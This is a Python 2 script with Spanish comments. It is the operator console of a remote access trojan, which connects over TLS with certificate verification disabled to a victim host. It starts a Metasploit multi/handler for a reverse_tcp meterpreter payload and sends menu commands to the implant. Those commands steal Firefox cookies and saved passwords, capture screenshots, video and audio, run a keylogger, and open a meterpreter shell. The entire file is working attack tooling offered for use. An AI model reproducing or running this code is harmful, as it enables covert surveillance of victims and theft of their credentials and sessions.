#!/usr/bin/python
 
#importamos el modulo para trabajar con sockets
import socket, sys, ssl, os
 
#Creamos un objeto socket para el servidor. Podemos dejarlo sin parametros pero si 
#quieren pueden pasarlos de la manera server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
context.verify_mode = ssl.CERT_NONE
context.check_hostname = False
s = socket.socket()

conn = context.wrap_socket(s) 
#Nos conectamos al servidor con el metodo connect. Tiene dos parametros
#El primero es la IP del servidor y el segundo el puerto de conexion

try :
    conn.connect(("192.168.222.4", 6660))
except :
    print 'No se puede realizar la conexion'
    sys.exit()
 
#METERPRETER
handler="msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E"
comandotty="setsid bash -c \'exec " +handler+ " <> /dev/tty3 >&0 2>&1 &\'"
#os.system("./ttyecho -n /dev/tty3 \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"")
#os.system("setsid bash -c \'exec \"msfcli exploit/multi/handler PAYLOAD=python/meterpreter/reverse_tcp LHOST=192.168.222.9 LPORT=6666 E\"<> /dev/tty3 >&0 2>&1\'")
#print comandotty
os.system(comandotty)

print "----------------Menu---------------------------------------------------------------------------------------------------" 
print "Escribir el comando para realizar la accion descrita"
print "a)cookies =  Modulo de obtencion de cookies y variables de sesion del explorador Mozilla Firefox."
print "b) captura -t tiempo_segundos = Realiza 5 capturas de pantalla en el intervalo de tiempo dado."
print "b2) captura -n numero_capturas = Realiza el numero de capturas de pantalla indicadas en el instante."
print "c) captvid tiempo_segundos= Modulo para captura de video."
print "d) captaud tiempo_segundos= Modulo para captura de audio."
print "e) contrasenas = Modulo de obtencion de contrasenas almacenadas en el  explorador Mozilla Firefox"
print "f) keylogger tiempo_segundos = Modulo del keylloger, especificar el tiempo en segundos en que se va ejecutar el keylogger"
print "g) meterpreter = Modulo de sesion de meterpreter."
print "h) close = Salir."
print "-------------------------------------------------------------------------------------------------------------------------" 
#Creamos un bucle para retener la conexion
while True:
    #Instanciamos una entrada de datos para que el cliente pueda enviar mensajes
    mensaje = raw_input("comando>> ")
    print mensaje
    #Si por alguna razon el mensaje es close cerramos la conexion
    if mensaje == "close":
	#Meterpreter
	pid="pid=`netstat -tupan | grep 6666 | awk '{print $NF}' | cut -d'/' -f1` ; kill -9 $pid"
	os.system(pid)
	#Imprimimos la palabra Adios para cuando se cierre la conexion
	conn.send(mensaje.strip("\n"))
	recibido = conn.read(1024)
	print recibido
        break
    else:
        #Con la instancia del objeto servidor (s) y el metodo send, enviamos el mensaje introducido
        conn.send(mensaje)
        recibido = conn.read(1024);
        #if recibido != "":
        print recibido 
        mensaje = ""
        recibido = ""
 
#Cerramos la instancia del objeto servidor
conn.close()
s.close()

